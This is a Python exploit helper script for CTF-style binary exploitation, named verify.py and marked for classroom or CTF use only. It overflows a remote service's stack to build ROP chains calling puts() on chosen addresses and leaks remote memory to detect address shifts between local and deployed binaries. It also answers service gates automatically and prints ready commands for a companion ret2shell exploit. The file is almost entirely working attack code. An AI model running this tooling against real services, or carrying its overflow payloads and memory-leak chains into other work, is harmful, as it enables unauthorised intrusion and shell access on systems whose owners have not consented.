#!/usr/bin/env python3
"""Remote-vs-local oracle: is the binary on the server the same build as the one I have?

Lesson from Echo32: the deployed binary was a different build with every .text address
shifted by -16 bytes. Every exploit using local addresses silently failed and it looked
like NX/ASLR/libc problems. This tool answers that question in one shot BEFORE you exploit.

How: use the stack overflow to call puts(ADDR) and compare the bytes the server prints
back with the local binary at ADDR, trying a range of uniform shifts. (puts only: see
the Oracle note - printf(ADDR) would treat the leaked bytes as a format string.)

Usage:
  python3 verify.py --binary ./echo32 --host H --port P              # auto offset, auto funcs
  python3 verify.py --binary ./echo32 --host H --port P --offset 132
  python3 verify.py --binary ./echo32 --host H --port P --read 0x08049196 # dump remote bytes
  python3 verify.py --binary ./echo32 --host H --port P --dry-run

Needs: non-PIE binary, a stack overflow reaching RET, and puts in the PLT.
Authorised classroom/CTF use only.
"""
import argparse
import os
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from elftool import ELF, fmt_addr  # noqa: E402


def walk_obstacles(s, args, text):
    """Answer a live gate and send any --pre lines, returning everything read.

    verify.py measures the remote build by reading its memory through puts. Behind a gate
    it was reading the GATE's output instead and reporting no shift - and the build shift
    is the failure mode that silently invalidates every address computed from the local
    binary (live Echo32 sits -0x10 from its downloaded copy).
    """
    try:
        from auto_pwn import answer_gate, pass_gates
        import types as _t
        a = _t.SimpleNamespace(timeout=args.timeout, idle=args.idle, gate_delay=0.25)
        if text and answer_gate(text) is not None:
            text, _tf = pass_gates(s, a, text)
    except Exception:
        pass
    for line in (getattr(args, "pre", None) or []):
        try:
            s.sendall(line.encode("latin-1", "replace") + b"\n")
        except OSError:
            break
        time.sleep(0.15)
        text += recv_idle(s, min(args.timeout, 1.5), args.idle)
    return text


def recv_idle(sock, timeout=2.0, idle=0.4):
    sock.settimeout(timeout)
    out = b""
    while True:
        try:
            d = sock.recv(4096)
            if not d:
                break
            out += d
            sock.settimeout(idle)
        except socket.timeout:
            break
        except OSError:
            break
    return out


# Chained-read budget for short leaks (puts() stops at the first NUL). Kept small so a
# 3-probe run stays under ~60s; raise to 24/24 only if a probe still comes back short.
DUMP_N, DUMP_READS = 16, 16


class Oracle:
    def __init__(self, elf, args):
        self.elf, self.args = elf, args
        self.bits = elf.bits
        self.p = (lambda x: struct.pack("<I", x & 0xFFFFFFFF)) if self.bits == 32 else \
                 (lambda x: struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF))
        # NOTE: chain() calls leak_fn(target), i.e. puts(target) - which prints the
        # string at `target`. That is ONLY a valid memory-read primitive for puts.
        # printf(target) would treat the leaked bytes as a FORMAT STRING (any '%' is
        # interpreted, '%n' writes), so printf is not supported here. A correct printf
        # read needs printf("%s", target) - a "%s" string addr + an extra arg slot -
        # which this oracle does not build. Require puts; fail loudly otherwise.
        self.leak_fn = args.leak_func or ("puts" if "puts" in elf.plt else None)
        if self.leak_fn == "printf":
            sys.exit("[!] printf is NOT a safe read primitive here: chain() would call "
                     "printf(target), using the leaked address as a format string. "
                     "Use a service/binary with puts in the PLT.")
        if not self.leak_fn:
            sys.exit("[!] no puts in the PLT; this oracle reads memory via puts(target) only. "
                     "(printf would need printf(\"%s\", target), which is not built here.)")
        self.leak_plt = elf.plt[self.leak_fn]
        self.pop_rdi = None
        if self.bits == 64:
            g = elf.gadgets()
            self.pop_rdi = (g.get("pop rdi; ret") or [None])[0]
            if self.pop_rdi is None:
                sys.exit("[!] 64-bit but no `pop rdi; ret` gadget; cannot pass the address argument")

    def chain(self, target):
        pad = b"A" * self.args.offset
        if self.bits == 32:
            return pad + self.p(self.leak_plt) + self.p(0x41414141) + self.p(target)
        return pad + self.p(self.pop_rdi) + self.p(target) + self.p(self.leak_plt)

    def remote_read(self, target):
        payload = self.chain(target)
        if self.args.send_mode == "line":
            payload += b"\n"
        s = socket.create_connection((self.args.host, self.args.port), timeout=self.args.timeout)
        try:
            pre = b""
            if not self.args.noreceive:
                pre = recv_idle(s, self.args.timeout, self.args.idle)
            walk_obstacles(s, self.args, pre)
            s.sendall(payload)
            time.sleep(0.3)
            out = recv_idle(s, self.args.timeout, self.args.idle)
        finally:
            s.close()
        return out

    def baseline(self):
        """Response to a harmless input: whatever the service says on its own. Used to
        locate where the puts() leak actually starts on services that print their own
        chatter (live Echo32 prints 'Message received.\n') and never echo the payload."""
        if getattr(self, "_baseline", None) is None:
            self._baseline = b""
            try:
                s = socket.create_connection((self.args.host, self.args.port), timeout=self.args.timeout)
                try:
                    pre = b""
                    if not self.args.noreceive:
                        pre = recv_idle(s, self.args.timeout, self.args.idle)
                    walk_obstacles(s, self.args, pre)
                    s.sendall(b"A\n")
                    time.sleep(0.2)
                    self._baseline = recv_idle(s, self.args.timeout, self.args.idle)
                finally:
                    s.close()
            except OSError:
                pass
        return self._baseline

    def leak_bytes(self, target, out=None):
        """The bytes puts() printed for `target`, with any echo of our payload removed.

        An echo service (read()+write()) sends our whole payload back BEFORE the puts
        leak, and the payload contains p(target) in its last slot - so rfind(p(target))
        is fragile. Instead we skip the exact bytes we SENT: locate the full payload in
        the response and take only what follows it. Falls back to rfind(p(target)) only
        if the payload was not echoed verbatim (e.g. a NUL-truncated input function)."""
        sent = self.chain(target)
        if self.args.send_mode == "line":
            sent += b"\n"
        if out is None:
            out = self.remote_read(target)
        i = out.find(sent)
        if i >= 0:
            seg = out[i + len(sent):]
        else:
            # Payload was NOT echoed. Do NOT return the whole response - it begins with
            # the service's own chatter, which would shift every address comparison by
            # the length of that chatter. Cut the prefix this service always emits.
            base = self.baseline()
            j = 0
            while j < min(len(base), len(out)) and base[j] == out[j]:
                j += 1
            seg = out[j:] if j else out
            k = seg.rfind(self.p(target))
            if k >= 0:
                seg = seg[k + len(self.p(target)):]
        seg = seg.lstrip(b"\n")
        if seg.endswith(b"\n"):
            seg = seg[:-1]
        return seg

    def dump(self, addr, n=32, max_reads=24):
        """Reassemble n bytes of remote memory from chained reads: puts() stops at a NUL,
        so after each leak of L bytes the byte at +L is 0x00 and we re-read from +L+1."""
        mem = bytearray()
        reads = 0
        while len(mem) < n and reads < max_reads:
            mem += self.leak_bytes(addr + len(mem)) + b"\x00"
            reads += 1
        return bytes(mem[:n]), reads


def positional_shifts(elf, addr, mem, max_shift):
    """Exploit-shifts s (remote = local + s) for which local code at addr-s equals the
    remote dump at addr on every non-operand byte. The dump is anchored at addr, so
    this is a fixed-position comparison - much stricter than searching for a window."""
    n = len(mem)
    hits = []
    for d in range(-max_shift, max_shift + 1):
        loc = elf.read(addr + d, n)
        if len(loc) == n and _masked_eq(loc, mem) == n:
            hits.append(-d)
    return hits


def pick_targets(elf, want):
    """Functions whose code we will read remotely: sink function, main, win-like, then others."""
    rep_frames = elf.frames()
    order = []
    for n, f in rep_frames.items():
        if f["sinks"] and n in elf.functions:
            order.append(n)
    for n in ("main",):
        if n in elf.functions and n not in order:
            order.append(n)
    for n in elf.win_symbols:
        if n not in order:
            order.append(n)
    for n, a in sorted(elf.functions.items(), key=lambda kv: kv[1]):
        if n not in order and not n.startswith(("_", "deregister", "register", "frame_dummy")):
            order.append(n)
    return [(n, elf.functions[n]) for n in order[:want]]


def local_expect(elf, addr, maxlen=24):
    """Bytes puts() would print for memory at addr: up to the first NUL."""
    raw = elf.read(addr, maxlen)
    nul = raw.find(b"\x00")
    return raw if nul < 0 else raw[:nul]


def rel_mask(code):
    """Positions of rel32 operands after call/jmp (e8/e9): they change when .text moves but PLT does not."""
    masked = set()
    i = 0
    while i < len(code):
        if code[i] in (0xE8, 0xE9):
            masked.update(range(i + 1, i + 5))
            i += 5
        else:
            i += 1
    return masked


def exec_sections(elf):
    """(vaddr, bytes) for every executable section."""
    from elftool import SHF_EXECINSTR
    out = []
    for s in elf.sections:
        if (s["flags"] & SHF_EXECINSTR) and s["size"]:
            out.append((s["addr"], elf.data[s["offset"]:s["offset"] + s["size"]]))
    return out


def _masked_eq(a, b):
    """Longest-prefix masked-equality length of two byte strings (call/jmp operands ignored)."""
    n = min(len(a), len(b))
    masked = rel_mask(a[:n])
    good = 0
    for k in range(n):
        if k in masked:
            good += 1
            continue
        if a[k] == b[k]:
            good += 1
        else:
            break
    return good


def _masked_score(a, b):
    """Number of REAL (non-wildcard) bytes that matched before the first mismatch.

    rel_mask wildcards the 4 operand bytes after every call/jmp. _masked_eq counts those
    wildcards as matches, so in call-dense code a wrong alignment scores just as high as
    the right one - that is how the live Echo32 reported +0x2 instead of -0x10. Scoring
    only the bytes that actually carry information fixes it."""
    n = min(len(a), len(b))
    masked = rel_mask(a[:n])
    real = 0
    for k in range(n):
        if k in masked:
            continue
        if a[k] == b[k]:
            real += 1
        else:
            break
    return real


def confirm_shift(orc, elf, shift, targets):
    """Prove a candidate shift by reading remote memory at addr+shift and requiring the
    LOCAL bytes at addr. A heuristic that cannot confirm itself is not an answer."""
    for name, addr in targets:
        local = local_expect(elf, addr, 16)
        if len(local) < 4:
            continue
        try:
            remote = orc.leak_bytes(addr + shift)
        except OSError:
            continue
        if not remote:
            continue
        n = min(len(local), len(remote))
        if n >= 4 and local[:n] == remote[:n]:
            return True, name, local[:n]
    return False, None, b""


def find_shift(elf, probe_addr, out, seed=12):
    """Infer local->remote shifts from a remote read, ignoring the banner in `out`.

    Anchor with a `seed`-byte local window (operand-masked) found anywhere in `out`,
    then SCORE each candidate by how far the match extends from that anchor. A shift
    that is right-by-coincidence over `seed` bytes stops extending quickly; the true
    uniform shift extends across the whole leaked run. Returns {shift: best_score}.
    The banner is plain ASCII and never matches a code window, so it is skipped free.
    """
    scores = {}
    for base, blob in exec_sections(elf):
        for off in range(0, len(blob) - seed + 1):
            win = blob[off:off + seed]
            masked = rel_mask(win)
            keep = [k for k in range(seed) if k not in masked]
            if len(keep) < seed - 4:
                continue
            anchor = keep[0]
            j = 0
            while True:
                i = out.find(win[anchor:anchor + 1], j)
                if i < 0 or i - anchor < 0:
                    break
                start = i - anchor
                seg = out[start:start + seed]
                if len(seg) == seed and all(seg[k] == win[k] for k in keep):
                    # extend the match as far as both sides allow
                    ext = _masked_score(blob[off:], out[start:])
                    sh = (base + off) - (probe_addr + start)   # leak[0] == remote[probe_addr]
                    scores[sh] = max(scores.get(sh, 0), ext)
                    break
                j = i + 1
    return scores


def fuzzy_found(exp, out, min_compared=8):
    """Is `exp` present in `out`, ignoring rel32 operands of call/jmp (e8/e9)?

    Requires a PERFECT match on every non-operand byte over at least `min_compared`
    of them. The masking lets the match survive relocated code (call/jmp targets
    change when .text moves) while the 100%-on-the-rest rule kills the false
    positives that a percentage threshold lets through on repetitive code.
    """
    if len(exp) < 4:
        return exp in out and len(exp) >= 3
    masked = rel_mask(exp)
    anchor = exp[:3]
    start = 0
    while True:
        i = out.find(anchor, start)
        if i < 0:
            return False
        seg = out[i:i + len(exp)]
        if len(seg) == len(exp):
            compared = sum(1 for k in range(len(exp)) if k not in masked)
            equal = sum(1 for k in range(len(exp)) if k not in masked and seg[k] == exp[k])
            if compared >= min_compared and equal == compared:
                return True
        start = i + 1


def main():
    ap = argparse.ArgumentParser(description="Remote-vs-local binary oracle (uniform shift detector)")
    ap.add_argument("--binary", required=True)
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--offset", type=int, help="filler bytes to RET (default: from elftool frame analysis)")
    ap.add_argument("--leak-func", choices=["puts"], help="PLT function used to print memory (puts only; see Oracle note)")
    ap.add_argument("--funcs", type=int, default=3, help="how many functions to compare (default 3)")
    ap.add_argument("--max-shift", type=int, default=0x200, help="search shifts in [-N, +N] (default 0x200)")
    ap.add_argument("--read", help="just dump remote bytes at this address and exit")
    ap.add_argument("--send-mode", choices=["raw", "line"], default="raw")
    ap.add_argument("--pre", action="append", default=[], metavar="LINE",
                    help="line(s) to send before each probe, e.g. a menu option. "
                         "Live arithmetic/nonce gates are answered automatically")
    ap.add_argument("--noreceive", action="store_true")
    ap.add_argument("--timeout", type=float, default=4.0)
    ap.add_argument("--idle", type=float, default=0.5)
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    try:
        elf = ELF(args.binary)
    except (OSError, ValueError) as exc:
        sys.exit(f"[!] {exc}")
    if elf.pie:
        sys.exit("[!] PIE binary: fixed addresses do not exist; this oracle needs a leak first")
    if args.offset is None:
        cands = elf.report()["ret_offset_candidates"]
        if not cands:
            sys.exit("[!] could not infer the RET offset; pass --offset")
        args.offset = cands[0]
        print(f"[*] offset={args.offset} (from frame analysis; override with --offset)")

    orc = Oracle(elf, args)
    print(f"[*] leak via {orc.leak_fn}@plt={fmt_addr(orc.leak_plt, elf.bits)}"
          + (f" pop_rdi={fmt_addr(orc.pop_rdi, 64)}" if orc.pop_rdi else ""))

    if args.read:
        addr = int(args.read, 0)
        if args.dry_run:
            print(f"[dry] payload={orc.chain(addr)!r}")
            return 0
        out = orc.remote_read(addr)
        print(f"[*] raw response ({len(out)} bytes):\n{out!r}")
        leak = orc.leak_bytes(addr, out)
        if len(leak) < 12:                      # NUL within 12B: one puts() is too short to compare
            try:
                leak, nreads = orc.dump(addr, n=DUMP_N, max_reads=DUMP_READS)
                print(f"[*] short leak -> reassembled {len(leak)}B from {nreads} chained reads: {leak.hex()}")
            except (OSError, socket.timeout) as exc:
                print(f"[!] dump failed: {exc}; comparing short leak only")
        exp = elf.read(addr, len(leak))         # equal-length local span, NULs included
        print(f"[*] local bytes at {fmt_addr(addr, elf.bits)}: {exp.hex()}  "
              f"{'FOUND in response' if fuzzy_found(exp, leak) else 'NOT found in response'}")
        return 0

    targets = pick_targets(elf, args.funcs)
    if not targets:
        sys.exit("[!] no functions to probe")
    print("[*] probing: " + ", ".join(f"{n}={fmt_addr(a, elf.bits)}" for n, a in targets))
    if args.dry_run:
        for n, a in targets:
            print(f"[dry] {n}: payload={orc.chain(a)!r}")
        return 0

    from collections import defaultdict
    probes_ok = 0            # probes that produced any response
    same_votes = 0           # probes where remote==local exactly
    weight = defaultdict(int)   # exploit-shift -> summed match length across probes
    votes = defaultdict(int)    # exploit-shift -> number of probes it is the best match for
    for name, addr in targets:
        t0 = time.time()
        try:
            out = orc.remote_read(addr)
        except OSError as exc:
            print(f"[!] {name}: connection error {exc}")
            continue
        if not out:
            print(f"[!] {name}: empty response (wrong offset? service closed?)")
            continue
        probes_ok += 1
        leak = orc.leak_bytes(addr, out)                     # payload echo stripped
        dumped = len(leak) < 12                              # NUL within 12B: one puts() too short
        if dumped:
            try:
                leak, _ = orc.dump(addr, n=DUMP_N, max_reads=DUMP_READS)   # chain reads past each NUL
            except (OSError, socket.timeout) as exc:
                print(f"[!] dump failed: {exc}; comparing short leak only")
                dumped = False
        # dumped -> compare the equal-length local span (NULs included); otherwise unchanged
        exact = elf.read(addr, len(leak)) if dumped else local_expect(elf, addr)
        same = fuzzy_found(exact, leak)                      # remote(addr) == local(addr)?
        # find_shift keys are (local_addr - probe_addr); exploit shift (remote=local+shift) is the negation
        # The leak is anchored at `addr` (echo stripped), so an EXACT fixed-position
        # comparison against the local image is possible - far stricter than sliding a
        # fuzzy window around. Prefer it; fall back to the window search only if it
        # finds nothing (e.g. leak too short to be distinctive).
        pos = positional_shifts(elf, addr, leak, args.max_shift) if len(leak) >= 6 else []
        if pos:
            expl = {sh: len(leak) * 10 for sh in pos}        # exact anchored match
        else:
            raw = find_shift(elf, addr, leak)                # {raw_shift: match_len}
            expl = {-k: v for k, v in raw.items()}           # {exploit_shift: match_len}
        if same:
            same_votes += 1
            expl[0] = max(expl.get(0, 0), len(exact))
        best_here = max(expl, key=expl.get) if expl else None
        for sh, ln in expl.items():
            weight[sh] += ln
        if best_here is not None:
            votes[best_here] += 1
        status = "MATCH (same build)" if same else "DIFFERENT"
        if best_here is not None and not same:
            extra = f"  -> best exploit-shift {best_here:+d} (match {expl[best_here]}B)"
        elif not same:
            extra = "  -> no shift found (inspect with --read)"
        else:
            extra = ""
        print(f"[*] {name:<14} {fmt_addr(addr, elf.bits)} local={exact[:8].hex():<16} {status}{extra}"
              f"  [{time.time() - t0:.1f}s{', dumped' if dumped else ''}]")

    print()
    if probes_ok == 0:
        print("[!] no usable responses; check --offset / --send-mode / --noreceive")
        return 1
    if same_votes == probes_ok:
        print("[+] remote binary == local binary at every probed address. Use local addresses as-is.")
        return 0
    if not weight:
        print("[!] remote differs from local and no consistent shift was found.")
        print("    Different code entirely, or the leak did not fire. Inspect with --read <addr>.")
        return 1
    # winner: most probes picked it as best; break ties by summed match length
    best = max(weight, key=lambda s: (votes.get(s, 0), weight[s]))
    nvotes = votes.get(best, 0)
    if best == 0:
        alt = sorted(((s, votes[s]) for s in votes if s != 0), key=lambda x: -x[1])
        print(f"[?] inconsistent: {same_votes}/{probes_ok} probes say same build, others differ: {alt[:6]}")
        print("    Possible partial relocation; inspect with --read before trusting any shift.")
        return 1
    okc, cname, cbytes = confirm_shift(orc, elf, best, targets)
    if not okc:
        print(f"[?] candidate exploit-shift {best:+#x} could NOT be confirmed by a direct read.")
        print("    Treat it as a GUESS. The exploit is the real oracle - try these in order:")
        for cand in (best, -0x10, 0, -0x20, 0x10, 0x20):
            print(f"      python3 {os.path.basename(__file__).replace('verify','ret2shell')} "
                  f"--binary {args.binary} --host {args.host} --port {args.port} --shift={cand:+#x}")
        return 1
    print(f"[+] remote binary is a DIFFERENT build: uniform exploit-shift {best:+#x} ({best:+d}) bytes "
          f"[best match in {nvotes}/{probes_ok} probes, CONFIRMED by direct read of "
          f"{cname} -> {cbytes[:8].hex()}].")
    print(f"    i.e. remote_addr = local_addr {best:+#x}.  Apply it with:")
    print(f"      python3 elftool.py {args.binary} --shift={best:+#x}")
    print(f"      python3 ret2shell.py --binary {args.binary} --host H --port P --shift={best:+#x}")
    for n, a in list(elf.win_symbols.items()) + [(k, v) for k, v in elf.functions.items() if k == "main"]:
        print(f"    {n:<14} local {fmt_addr(a, elf.bits)} -> remote {fmt_addr(a + best, elf.bits)}")
    g = elf.gadgets()
    for gname in ("jmp esp", "jmp rsp"):
        if gname in g:
            print(f"    {gname:<14} local {fmt_addr(g[gname][0], elf.bits)} -> remote {fmt_addr(g[gname][0] + best, elf.bits)}")
    print("    NOTE: PLT/GOT live in a different section and are usually NOT shifted; confirm with --read.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
